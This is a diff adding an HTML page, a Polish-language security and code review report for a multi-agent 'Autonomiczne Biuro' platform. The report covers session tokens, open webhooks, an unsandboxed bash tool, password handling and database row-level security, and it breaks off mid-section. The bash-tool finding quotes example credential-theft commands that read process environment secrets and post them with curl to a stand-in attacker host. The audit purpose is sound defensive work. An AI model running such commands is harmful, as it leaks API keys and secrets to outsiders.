@@ -1,0 +1,1255 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Autonomiczne Biuro — Raport v2</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+:root {
+  --ink:       #0e0f13;
+  --ink2:      #16181f;
+  --ink3:      #1e2028;
+  --line:      #272b38;
+  --line2:     #32374a;
+  --muted:     #475069;
+  --dim:       #7b88a8;
+  --text:      #c4ceea;
+  --bright:    #e8edf8;
+  --white:     #f0f4ff;
+
+  --emerald:   #34d399;
+  --emerald-bg:rgba(52,211,153,.08);
+  --amber:     #fbbf24;
+  --amber-bg:  rgba(251,191,36,.08);
+  --rose:      #fb7185;
+  --rose-bg:   rgba(251,113,133,.08);
+  --sky:       #38bdf8;
+  --sky-bg:    rgba(56,189,248,.08);
+  --violet:    #a78bfa;
+  --violet-bg: rgba(167,139,250,.08);
+
+  --mono: 'JetBrains Mono', monospace;
+  --head: 'Syne', sans-serif;
+}
+
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: var(--head);
+  background: var(--ink);
+  color: var(--text);
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+/* ══ STRIPE TEXTURE ══ */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(255,255,255,.012) 2px,
+    rgba(255,255,255,.012) 4px
+  );
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ══ MASTHEAD ══ */
+.masthead {
+  position: relative;
+  overflow: hidden;
+  padding: 64px 72px 56px;
+  border-bottom: 1px solid var(--line);
+  background: linear-gradient(135deg, #0e0f13 0%, #121620 60%, #151b2e 100%);
+}
+.masthead::after {
+  content: '';
+  position: absolute;
+  bottom: -120px; right: -80px;
+  width: 520px; height: 520px;
+  background: radial-gradient(circle, rgba(56,189,248,.06) 0%, transparent 68%);
+  pointer-events: none;
+}
+.masthead-eyebrow {
+  display: inline-flex; align-items: center; gap: 10px;
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: .12em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 24px;
+}
+.masthead-eyebrow::before {
+  content: '';
+  width: 28px; height: 1px;
+  background: var(--line2);
+}
+.masthead-eyebrow::after {
+  content: '';
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--emerald);
+  box-shadow: 0 0 8px var(--emerald);
+}
+h1 {
+  font-size: 46px;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  color: var(--white);
+  line-height: 1.05;
+  margin-bottom: 12px;
+}
+h1 span { color: var(--sky); }
+.masthead-sub {
+  font-size: 15px;
+  color: var(--dim);
+  font-weight: 400;
+  max-width: 600px;
+  line-height: 1.7;
+  margin-bottom: 40px;
+}
+.masthead-chips {
+  display: flex; flex-wrap: wrap; gap: 10px;
+}
+.chip {
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: .06em;
+  padding: 5px 12px;
+  border-radius: 4px;
+  border: 1px solid var(--line2);
+  color: var(--dim);
+  background: var(--ink2);
+}
+.chip-em { border-color: rgba(56,189,248,.3); color: var(--sky); background: var(--sky-bg); }
+
+/* ══ DELTA BANNER ══ */
+.delta-banner {
+  margin: 0 72px;
+  border: 1px solid var(--line2);
+  border-top: none;
+  background: var(--ink2);
+  padding: 20px 28px;
+  display: grid;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 1px;
+}
+.delta-cell {
+  padding: 12px 16px;
+  text-align: center;
+  border-right: 1px solid var(--line);
+}
+.delta-cell:last-child { border-right: none; }
+.delta-label {
+  font-family: var(--mono);
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: .1em;
+  color: var(--muted);
+  margin-bottom: 6px;
+}
+.delta-score {
+  font-family: var(--mono);
+  font-size: 24px;
+  font-weight: 700;
+  line-height: 1;
+}
+.delta-change {
+  font-family: var(--mono);
+  font-size: 11px;
+  margin-top: 4px;
+}
+.up   { color: var(--emerald); }
+.flat { color: var(--dim); }
+.dn   { color: var(--rose); }
+
+/* ══ LAYOUT ══ */
+.page { max-width: 1120px; margin: 0 auto; padding: 56px 72px 80px; position: relative; z-index: 1; }
+
+/* ══ SECTION ══ */
+.section { margin-bottom: 60px; }
+.section-label {
+  display: flex; align-items: center; gap: 14px;
+  margin-bottom: 28px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid var(--line);
+}
+.section-num {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--muted);
+  letter-spacing: .1em;
+  width: 30px;
+}
+.section-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--bright);
+  letter-spacing: -.3px;
+}
+.section-badge {
+  margin-left: auto;
+  font-family: var(--mono);
+  font-size: 10px;
+  letter-spacing: .1em;
+  text-transform: uppercase;
+  padding: 4px 10px;
+  border-radius: 3px;
+  font-weight: 500;
+}
+.b-emerald { background: var(--emerald-bg); color: var(--emerald); border: 1px solid rgba(52,211,153,.25); }
+.b-amber   { background: var(--amber-bg);   color: var(--amber);   border: 1px solid rgba(251,191,36,.25); }
+.b-rose    { background: var(--rose-bg);     color: var(--rose);    border: 1px solid rgba(251,113,133,.25); }
+.b-sky     { background: var(--sky-bg);      color: var(--sky);     border: 1px solid rgba(56,189,248,.25); }
+.b-violet  { background: var(--violet-bg);   color: var(--violet);  border: 1px solid rgba(167,139,250,.25); }
+
+/* ══ COMMIT DELTA CARD ══ */
+.commit-cards {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+  margin-bottom: 24px;
+}
+.commit-card {
+  background: var(--ink2);
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  padding: 20px 22px;
+}
+.commit-card h4 {
+  font-size: 12px;
+  font-family: var(--mono);
+  text-transform: uppercase;
+  letter-spacing: .08em;
+  color: var(--muted);
+  margin-bottom: 14px;
+}
+.commit-item {
+  display: flex; align-items: flex-start; gap: 10px;
+  margin-bottom: 10px;
+  font-size: 13px;
+  color: var(--dim);
+  line-height: 1.5;
+}
+.commit-item:last-child { margin-bottom: 0; }
+.ci-icon {
+  font-size: 13px;
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+
+/* ══ FINDING ══ */
+.findings { display: flex; flex-direction: column; gap: 14px; }
+
+.finding {
+  background: var(--ink2);
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  overflow: hidden;
+}
+.finding-head {
+  display: flex; align-items: center; gap: 14px;
+  padding: 13px 18px;
+  border-bottom: 1px solid var(--line);
+}
+.sev-tag {
+  font-family: var(--mono);
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: .1em;
+  text-transform: uppercase;
+  padding: 3px 9px;
+  border-radius: 3px;
+  flex-shrink: 0;
+}
+.sev-critical { background: var(--rose-bg);     color: var(--rose);    border: 1px solid rgba(251,113,133,.3); }
+.sev-high     { background: var(--amber-bg);    color: var(--amber);   border: 1px solid rgba(251,191,36,.3); }
+.sev-medium   { background: var(--sky-bg);      color: var(--sky);     border: 1px solid rgba(56,189,248,.3); }
+.sev-low      { background: var(--emerald-bg);  color: var(--emerald); border: 1px solid rgba(52,211,153,.3); }
+.sev-fixed    { background: var(--violet-bg);   color: var(--violet);  border: 1px solid rgba(167,139,250,.3); }
+
+.finding-title {
+  font-size: 13.5px;
+  font-weight: 600;
+  color: var(--bright);
+  flex: 1;
+}
+.finding-file {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  background: var(--ink3);
+  padding: 2px 8px;
+  border-radius: 3px;
+  border: 1px solid var(--line);
+  white-space: nowrap;
+}
+.finding-body {
+  padding: 16px 18px;
+  color: var(--dim);
+  font-size: 13.5px;
+  line-height: 1.75;
+}
+.finding-body p { margin-bottom: 10px; }
+.finding-body p:last-child { margin-bottom: 0; }
+.finding-body ul {
+  padding-left: 20px;
+  margin: 8px 0;
+  line-height: 2;
+}
+
+code {
+  font-family: var(--mono);
+  font-size: 11.5px;
+  background: var(--ink3);
+  border: 1px solid var(--line2);
+  padding: 1px 6px;
+  border-radius: 3px;
+  color: #9bb4e8;
+}
+
+/* ══ CODE DIFF ══ */
+.diff {
+  background: var(--ink);
+  border: 1px solid var(--line2);
+  border-radius: 8px;
+  padding: 14px 16px;
+  font-family: var(--mono);
+  font-size: 12px;
+  line-height: 1.9;
+  overflow-x: auto;
+  margin: 10px 0;
+}
+.diff .file-tag {
+  display: block;
+  font-size: 10px;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: .08em;
+  margin-bottom: 8px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--line);
+}
+.diff-bad  { color: #fb7185; }
+.diff-good { color: #34d399; }
+.diff-ctx  { color: var(--muted); }
+.diff-key  { color: #fbbf24; }
+
+/* ══ FIX ══ */
+.fix {
+  background: var(--emerald-bg);
+  border: 1px solid rgba(52,211,153,.18);
+  border-left: 3px solid var(--emerald);
+  border-radius: 4px;
+  padding: 12px 16px;
+  font-size: 13px;
+  color: #a7dfc8;
+  margin-top: 12px;
+  line-height: 1.7;
+}
+.fix strong { color: var(--emerald); }
+
+.warn-inline {
+  display: inline-block;
+  background: var(--amber-bg);
+  border: 1px solid rgba(251,191,36,.25);
+  border-radius: 4px;
+  padding: 2px 9px;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--amber);
+  vertical-align: middle;
+}
+
+/* ══ COMPARISON TABLE ══ */
+.ctable {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+  background: var(--ink2);
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  overflow: hidden;
+}
+.ctable th {
+  font-family: var(--mono);
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: .1em;
+  color: var(--muted);
+  background: var(--ink3);
+  padding: 10px 16px;
+  text-align: left;
+  border-bottom: 1px solid var(--line);
+}
+.ctable td {
+  padding: 11px 16px;
+  border-bottom: 1px solid var(--line);
+  color: var(--dim);
+  vertical-align: top;
+}
+.ctable tr:last-child td { border-bottom: none; }
+.ctable tr:hover td { background: rgba(255,255,255,.015); }
+.ok-cell  { color: var(--emerald); font-weight: 500; }
+.bad-cell { color: var(--rose); }
+.warn-cell{ color: var(--amber); }
+
+/* ══ PRIORITY ROW ══ */
+.plist { display: flex; flex-direction: column; gap: 12px; }
+.prow {
+  display: grid;
+  grid-template-columns: 48px 1fr auto;
+  align-items: start;
+  gap: 16px;
+  background: var(--ink2);
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  padding: 16px 18px;
+}
+.pnum {
+  font-family: var(--mono);
+  font-size: 22px;
+  font-weight: 700;
+  color: var(--line2);
+  line-height: 1.1;
+  padding-top: 2px;
+}
+.prow h4 { font-size: 13.5px; font-weight: 700; color: var(--bright); margin-bottom: 4px; }
+.prow p  { font-size: 13px; color: var(--dim); line-height: 1.6; }
+.peff {
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: 3px 10px;
+  border-radius: 20px;
+  white-space: nowrap;
+  align-self: start;
+  margin-top: 2px;
+}
+.eff-high { background: var(--emerald-bg); color: var(--emerald); border: 1px solid rgba(52,211,153,.25); }
+.eff-med  { background: var(--amber-bg);   color: var(--amber);   border: 1px solid rgba(251,191,36,.25); }
+.eff-low  { background: var(--sky-bg);     color: var(--sky);     border: 1px solid rgba(56,189,248,.25); }
+
+/* ══ SCORECARD FINAL ══ */
+.verdict-box {
+  background: var(--ink2);
+  border: 1px solid var(--line);
+  border-radius: 12px;
+  padding: 32px 36px;
+}
+.verdict-box h3 {
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--white);
+  margin-bottom: 16px;
+  letter-spacing: -.3px;
+}
+.verdict-box p {
+  font-size: 14px;
+  color: var(--dim);
+  line-height: 1.8;
+  margin-bottom: 12px;
+}
+.verdict-box p:last-child { margin-bottom: 0; }
+.highlight { color: var(--bright); font-weight: 600; }
+.hl-green  { color: var(--emerald); font-weight: 600; }
+.hl-amber  { color: var(--amber);   font-weight: 600; }
+.hl-rose   { color: var(--rose);    font-weight: 600; }
+.hl-sky    { color: var(--sky);     font-weight: 600; }
+
+/* ══ PROGRESS ══ */
+.pbar-row { display: flex; align-items: center; gap: 12px; margin-bottom: 10px; }
+.pbar-lbl { width: 160px; font-size: 12px; color: var(--dim); flex-shrink: 0; }
+.pbar-track { flex: 1; height: 5px; background: var(--ink3); border-radius: 3px; overflow: hidden; }
+.pbar-fill { height: 100%; border-radius: 3px; }
+.pbar-pct { font-family: var(--mono); font-size: 11px; color: var(--muted); width: 38px; text-align: right; }
+
+/* ══ HORIZONTAL RULE ══ */
+hr { border: none; border-top: 1px solid var(--line); margin: 28px 0; }
+
+/* ══ FOOTER ══ */
+footer {
+  background: var(--ink2);
+  border-top: 1px solid var(--line);
+  padding: 22px 72px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  position: relative; z-index: 1;
+}
+footer span { color: var(--dim); }
+</style>
+</head>
+<body>
+
+<!-- ══════════ MASTHEAD ══════════ -->
+<div class="masthead">
+  <div class="masthead-eyebrow">Code Review · Iteracja 2 · Post-commit v9</div>
+  <h1>Autonomiczne<br><span>Biuro</span> — Raport v2</h1>
+  <p class="masthead-sub">
+    Pogłębiona analiza projektu po najnowszym commicie (schema_v9, password.ts, AuthContext, DashboardPage, GoalsPage, ToolsPage).
+    Raport koncentruje się na nowych ustaleniach, zmienionym stanie bezpieczeństwa i pozostałych lukach.
+  </p>
+  <div class="masthead-chips">
+    <span class="chip">Node.js · TypeScript · React</span>
+    <span class="chip">PostgreSQL 16+ · pgvector</span>
+    <span class="chip">Docker Compose</span>
+    <span class="chip chip-em">Commit: schema_v9 + auth hardening</span>
+    <span class="chip">18.03.2026</span>
+  </div>
+</div>
+
+<!-- ══════════ DELTA SCORES ══════════ -->
+<div class="delta-banner">
+  <div class="delta-cell">
+    <div class="delta-label">Architektura</div>
+    <div class="delta-score up">8.0</div>
+    <div class="delta-change up">▲ +0.5</div>
+  </div>
+  <div class="delta-cell">
+    <div class="delta-label">Bezpieczeństwo</div>
+    <div class="delta-score up">6.5</div>
+    <div class="delta-change up">▲ +2.0</div>
+  </div>
+  <div class="delta-cell">
+    <div class="delta-label">Jakość kodu</div>
+    <div class="delta-score up">6.5</div>
+    <div class="delta-change up">▲ +0.5</div>
+  </div>
+  <div class="delta-cell">
+    <div class="delta-label">Testy</div>
+    <div class="delta-score flat">3.0</div>
+    <div class="delta-change flat">— 0</div>
+  </div>
+  <div class="delta-cell">
+    <div class="delta-label">Gotowość PROD</div>
+    <div class="delta-score up">6.0</div>
+    <div class="delta-change up">▲ +1.0</div>
+  </div>
+</div>
+
+<!-- ══════════ PAGE BODY ══════════ -->
+<div class="page">
+
+  <!-- ── 01 CO SIĘ ZMIENIŁO ── -->
+  <div class="section">
+    <div class="section-label">
+      <span class="section-num">01</span>
+      <span class="section-title">Co zmieniło się od ostatniego raportu</span>
+      <span class="section-badge b-sky">DELTA</span>
+    </div>
+
+    <div class="commit-cards">
+      <div class="commit-card">
+        <h4>✅ Naprawione od raportu v1</h4>
+        <div class="commit-item"><span class="ci-icon">🔒</span><span><strong style="color:var(--bright)">AUTH_ENABLED w Zod</strong> — env.ts ma już poprawny parser z domyślną wartością <code>true</code>. requireAuth() i requireRole() są podpięte na routach.</span></div>
+        <div class="commit-item"><span class="ci-icon">🔒</span><span><strong style="color:var(--bright)">Haszowanie haseł</strong> — password.ts używa <code>scrypt</code> + salt + <code>timingSafeEqual</code>. Solidna implementacja.</span></div>
+        <div class="commit-item"><span class="ci-icon">📊</span><span><strong style="color:var(--bright)">DashboardPage</strong> — live stats z API <code>/companies/:id/stats</code>, prawdziwe dane zamiast hardcoded 12/45/$12.42.</span></div>
+        <div class="commit-item"><span class="ci-icon">🎯</span><span><strong style="color:var(--bright)">GoalsPage</strong> — zaimplementowana, fetchuje dane, pokazuje statusy. Niestety bez drzewa hierarchii (patrz §04).</span></div>
+        <div class="commit-item"><span class="ci-icon">🔧</span><span><strong style="color:var(--bright)">ToolsPage</strong> — zaimplementowana, grid kart z ikonami per typ, agent_count.</span></div>
+        <div class="commit-item"><span class="ci-icon">⚡</span><span><strong style="color:var(--bright)">Indeksy DB (v9)</strong> — 7 nowych indeksów na kluczowych kolumnach (tasks, heartbeats, audit_log, messages, approvals). Znaczna poprawa wydajności zapytań.</span></div>
+        <div class="commit-item"><span class="ci-icon">🔐</span><span><strong style="color:var(--bright)">CompanyContext localStorage</strong> — selectedCompanyId persystuje między odświeżeniami przez COMPANY_STORAGE_KEY.</span></div>
+        <div class="commit-item"><span class="ci-icon">📱</span><span><strong style="color:var(--bright)">AuthContext + AuthPage</strong> — pełny flow login/register/logout z sesją w localStorage.</span></div>
+        <div class="commit-item"><span class="ci-icon">🏃</span><span><strong style="color:var(--bright)">agent_model przekazany do runtime</strong> — ClaudeRuntime używa <code>context.agent_model</code> z fallbackiem na domyślny model.</span></div>
+      </div>
+      <div class="commit-card">
+        <h4>🔴 Nadal nienaprawione / nowe odkrycia</h4>
+        <div class="commit-item"><span class="ci-icon">🚨</span><span><strong style="color:var(--bright)">Bash exec bez sandboxu</strong> — nadal bezpośredni <code>exec(params.command)</code>, brak whitelist.</span></div>
+        <div class="commit-item"><span class="ci-icon">🚨</span><span><strong style="color:var(--bright)">Token sesji = UUIDv4</strong> — przewidywalny format, nie kryptograficznie bezpieczny token.</span></div>
+        <div class="commit-item"><span class="ci-icon">🚨</span><span><strong style="color:var(--bright)">Integrations routes bez auth</strong> — /slack/events, /discord/webhook otwarte bez żadnego middleware.</span></div>
+        <div class="commit-item"><span class="ci-icon">⚠️</span><span><strong style="color:var(--bright)">Luka migracji nadal obecna</strong> — brak tabeli śledzenia, schema_v9 to kolejny patch zamiast systemu migracji.</span></div>
+        <div class="commit-item"><span class="ci-icon">⚠️</span><span><strong style="color:var(--bright)">Mock embeddingi w KnowledgeService</strong> — knowledge.ts też używa Math.random(), nie tylko memory.ts.</span></div>
+        <div class="commit-item"><span class="ci-icon">⚠️</span><span><strong style="color:var(--bright)">GeminiRuntime nierejstrowany w workerze</strong> — worker.ts importuje Claude i OpenAI, pomija Gemini mimo że Registry go ma.</span></div>
+        <div class="commit-item"><span class="ci-icon">⚠️</span><span><strong style="color:var(--bright)">db.transaction() bez RLS</strong> — transakcje DB nie ustawiają app.current_company_id, RLS jest obchodzone.</span></div>
+        <div class="commit-item"><span class="ci-icon">⚠️</span><span><strong style="color:var(--bright)">Template export niepełny</strong> — eksportuje agentów bez narzędzi, polityk, celów i budżetów.</span></div>
+        <div class="commit-item"><span class="ci-icon">⚠️</span><span><strong style="color:var(--bright)">CORS wildcard, brak helmet, brak rate limitu</strong> — bez zmian.</span></div>
+      </div>
+    </div>
+
+    <p style="font-size:13.5px;color:var(--dim);line-height:1.8;">
+      Commit v9 to <span class="highlight">solidny krok naprzód</span> — naprawiono największy krytyczny problem (AUTH), dodano prawdziwy dashboard
+      z live danymi i solidny flow autentykacji. Projekt przekroczył próg "można uruchomić lokalnie z sensownym UX".
+      Pozostałe problemy są poważne, ale bardziej operacyjne niż fundamentalne.
+    </p>
+  </div>
+
+  <!-- ── 02 BEZPIECZEŃSTWO — NOWE I POZOSTAŁE ── -->
+  <div class="section">
+    <div class="section-label">
+      <span class="section-num">02</span>
+      <span class="section-title">Bezpieczeństwo — nowe ustalenia po v9</span>
+      <span class="section-badge b-rose">KRYTYCZNE</span>
+    </div>
+    <div class="findings">
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-critical">CRITICAL</span>
+          <span class="finding-title">Token sesji = UUIDv4 — entropii za mało dla tokenu bezpieczeństwa</span>
+          <span class="finding-file">routes/auth.ts:96,141</span>
+        </div>
+        <div class="finding-body">
+          <p>Tokeny sesji są generowane przez <code>uuidv4()</code> — 122 bity entropii z CSPRNG, ale format jest rozpoznawalny, możliwy do wykrycia w logach, i wiele biblioteek/proxies loguje UUID inaczej niż opaque tokeny. Ważniejsze: jeśli UUID pochodzi z <code>Math.random()</code> w starszym środowisku Node (co przy pewnych wersjach v8 się zdarza), entropia dramatycznie spada.</p>
+          <div class="diff">
+            <span class="file-tag">routes/auth.ts — obecny kod:</span>
+            <span class="diff-bad">const token = uuidv4();  // ← UUID v4, przewidywalny format</span>
+            <span class="diff-ctx">const expiresAt = new Date();</span>
+            <span class="diff-ctx">expiresAt.setDate(expiresAt.getDate() + 3);  // ← 72h bez sliding expiry</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka:</strong> Zastąpić <code>uuidv4()</code> kryptograficznym tokenem:
+            <code>import { randomBytes } from 'crypto'; const token = randomBytes(32).toString('hex');</code>
+            — 256 bitów czystej entropii. Rozważyć skrócenie sesji do 24h z opcją "remember me" na 30 dni.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-critical">CRITICAL</span>
+          <span class="finding-title">Integracje Slack/Discord bez uwierzytelniania — open webhook endpoint</span>
+          <span class="finding-file">routes/integrations.ts</span>
+        </div>
+        <div class="finding-body">
+          <p>Endpointy <code>POST /api/integrations/slack/events</code> i <code>/discord/webhook</code> nie mają <em>żadnego</em> middleware autoryzacyjnego. Każdy kto zna adres może wywołać te endpointy i wstrzyknąć wiadomości do zadań agentów. Slack oficjalnie wymaga weryfikacji <code>X-Slack-Signature</code> — bez tego endpoint jest otwarty na replay attacks i content injection.</p>
+          <div class="diff">
+            <span class="file-tag">routes/integrations.ts — brak auth:</span>
+            <span class="diff-bad">router.post('/slack/events', async (req, res) => {</span>
+            <span class="diff-ctx">  // Brak: requireAuth(), weryfikacji signature, HMAC check</span>
+            <span class="diff-bad">  if (req.body.challenge) return res.send(req.body.challenge);</span>
+            <span class="diff-ctx">  await IntegrationService.handleSlackEvent(req.body.event);</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka:</strong> Dodać weryfikację podpisu Slack (<code>X-Slack-Signature: v0=HMAC-SHA256(signingSecret, timestamp + body)</code>). Dla Discorda — weryfikacja <code>X-Signature-Ed25519</code>. Middleware: <code>verifySlackSignature(req, signingSecret)</code> jako funkcja przed handlerem. W bazie dodać pole <code>webhook_secret</code> per integracja.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-critical">CRITICAL</span>
+          <span class="finding-title">Bash tool nadal RCE — brak sandboxu i whitelist po v9</span>
+          <span class="finding-file">tools/executor.ts:case 'bash'</span>
+        </div>
+        <div class="finding-body">
+          <p>Niezmienione od raportu v1. <code>exec(params.command)</code> bez jakiejkolwiek walidacji. Jedyna zmiana w v9 to dodanie indeksów DB — problem bezpieczeństwa bash tools nie był adresowany. Agent może wykonać <code>cat /proc/1/environ</code> aby wyeksfiltrować klucze API, lub <code>curl attacker.com -d "$(env)"</code>.</p>
+          <div class="fix">
+            <strong>Minimalna poprawka (szybka):</strong> Dodać pole <code>allowed_commands: string[]</code> do konfiguracji narzędzia bash i walidować przez <code>if (!tool.config.allowed_commands.some(cmd => params.command.startsWith(cmd))) throw new Error('Command not in whitelist')</code>.
+            <strong> Docelowa poprawka:</strong> Uruchamianie przez <code>docker run --rm --network none --memory 128m --cpus 0.5 -v workspace:/workspace:rw alpine sh -c "..."</code>.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-high">HIGH</span>
+          <span class="finding-title">Luka w upgradie hasła — warunek porównania plain-text jest zawsze false dla nowych użytkowników, ale ujawnia wzorzec</span>
+          <span class="finding-file">routes/auth.ts:131-137</span>
+        </div>
+        <div class="finding-body">
+          <p>Kod zawiera ścieżkę upgradu legacy hasła: <code>user.rows[0].pwd_hash === `hash_${password}`</code>. Ten wzorzec sugeruje że w bazie mogą istnieć "hasha" w formacie <code>hash_&lt;plaintext&gt;</code> — co jest de facto przechowywaniem plain-text haseł z prefiksem. Jeśli jakakolwiek starsza wersja kodu zapisała hasła w tym formacie do bazy, atakujący z dostępem do DB ma natychmiastowy dostęp do wszystkich starych haseł.</p>
+          <div class="diff">
+            <span class="file-tag">routes/auth.ts — problematyczny warunek:</span>
+            <span class="diff-ctx">let validPassword = await verifyPassword(password, user.rows[0].pwd_hash);</span>
+            <span class="diff-bad">if (!validPassword && user.rows[0].pwd_hash === `hash_${password}`) {</span>
+            <span class="diff-ctx">  validPassword = true;</span>
+            <span class="diff-ctx">  // upgrade to scrypt...</span>
+            <span class="diff-ctx">}</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka:</strong> Jeśli te konta faktycznie istnieją — uruchomić jednorazową migrację która wymusi reset hasła przez email. Jeśli nie — usunąć tę ścieżkę kodu w całości. Zostawianie warunków porównujących plain-text hasła to technical debt z potencjalnym wpływem bezpieczeństwa.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-high">HIGH</span>
+          <span class="finding-title">CORS wildcard + brak helmet + brak rate limitingu — trójca niezmienna od v1</span>
+          <span class="finding-file">server/src/index.ts</span>
+        </div>
+        <div class="finding-body">
+          <p>Mimo commit v9 skupiającego się na "auth hardening" trzy standardowe zabezpieczenia HTTP nadal nie istnieją w projekcie:</p>
+          <ul>
+            <li><code>app.use(cors())</code> — akceptuje requesty z każdej domeny (CSRF risk)</li>
+            <li>Brak <code>helmet</code> — brak nagłówków: CSP, X-Frame-Options, X-Content-Type-Options, HSTS</li>
+            <li>Brak <code>express-rate-limit</code> — endpoint <code>/auth/login</code> podatny na brute-force haseł</li>
+          </ul>
+          <div class="fix">
+            <strong>Poprawka (3 linie kodu):</strong> <code>pnpm add helmet express-rate-limit</code>, następnie: <code>app.use(helmet())</code>, <code>app.use(cors({ origin: env.ALLOWED_ORIGINS }))</code>, <code>app.use('/api/auth', rateLimit({ windowMs: 15*60*1000, max: 20 }))</code>.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-fixed">NAPRAWIONE</span>
+          <span class="finding-title">AUTH_ENABLED poprawnie zaimplementowane w env.ts + middleware</span>
+          <span class="finding-file">env.ts + middleware/auth.ts</span>
+        </div>
+        <div class="finding-body">
+          <p>Zod schema parsuje <code>AUTH_ENABLED</code> z domyślną wartością <code>'true'</code>, transformuje do boolean. Middleware <code>requireAuth()</code> i <code>requireRole()</code> obsługują tryb dev (<code>AUTH_ENABLED=false</code> → fake user) i tryb produkcyjny. Rozkładanie sesji przez <code>contextStore</code> działa poprawnie dla RLS. <span class="warn-inline">⚠ dev-bypass</span> pozostaje — przy <code>AUTH_ENABLED=false</code> każdy request dostaje rolę <code>'owner'</code> bez tokenu.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ── 03 BAZA DANYCH ── -->
+  <div class="section">
+    <div class="section-label">
+      <span class="section-num">03</span>
+      <span class="section-title">Baza danych — nowe ustalenia</span>
+      <span class="section-badge b-amber">WAŻNE</span>
+    </div>
+    <div class="findings">
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-critical">CRITICAL</span>
+          <span class="finding-title">db.transaction() nie ustawia RLS context — cross-tenant data leak możliwy w transakcjach</span>
+          <span class="finding-file">db/client.ts:transaction()</span>
+        </div>
+        <div class="finding-body">
+          <p>Funkcja <code>db.query()</code> poprawnie ustawia <code>set_config('app.current_company_id', ...)</code> gdy <code>contextStore</code> ma <code>companyId</code>. Jednak <code>db.transaction()</code> pobiera klienta i od razu startuje <code>BEGIN</code> — bez ustawiania RLS kontekstu. Wszystkie zapytania wewnątrz transakcji działają z <em>pustym</em> <code>current_company_id</code>, co oznacza że polityki RLS widzą NULL i blokują dostęp lub — jeśli polityka używa <code>true</code> jako fallback — przepuszczają wszystkie wiersze ze wszystkich firm.</p>
+          <div class="diff">
+            <span class="file-tag">db/client.ts — transakcja bez RLS:</span>
+            <span class="diff-ctx">transaction: async &lt;T&gt;(fn) =&gt; {</span>
+            <span class="diff-ctx">  const client = await pool.connect();</span>
+            <span class="diff-ctx">  await client.query('BEGIN');</span>
+            <span class="diff-bad">  // ← brak: await client.query("SET LOCAL app.current_company_id = $1", [companyId])</span>
+            <span class="diff-ctx">  const result = await fn(client);</span>
+            <span class="diff-ctx">  await client.query('COMMIT');</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka:</strong> Rozszerzyć sygnaturę <code>transaction(fn, companyId?: string)</code> i na początku transakcji: <code>if (companyId) await client.query("SELECT set_config('app.current_company_id', $1, true)", [companyId])</code>. Alternatywnie pobrać z <code>contextStore.getStore()?.companyId</code> — analogicznie do <code>db.query()</code>.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-high">HIGH</span>
+          <span class="finding-title">Schema v9 to kolejny patch — system migracji nadal bez wersjonowania</span>
+          <span class="finding-file">db/migrate.ts + schema_v9.sql</span>
+        </div>
+        <div class="finding-body">
+          <p>Commit v9 dodał <code>schema_v9.sql</code> z indeksami zamiast naprawić sam system migracji. Mamy teraz 9 plików SQL wykonywanych sekwencyjnie bez żadnego śladu w bazie. Jeśli serwer produkcyjny już posiada te indeksy (bo ktoś je ręcznie dodał), migrate.ts nadal spróbuje je tworzyć i cicho zignoruje błąd — albo nie, jeśli błąd nie jest na liście ignorowanych kodów.</p>
+          <div class="diff">
+            <span class="file-tag">schema_v9.sql — CREATE INDEX IF NOT EXISTS — przynajmniej używa IF NOT EXISTS:</span>
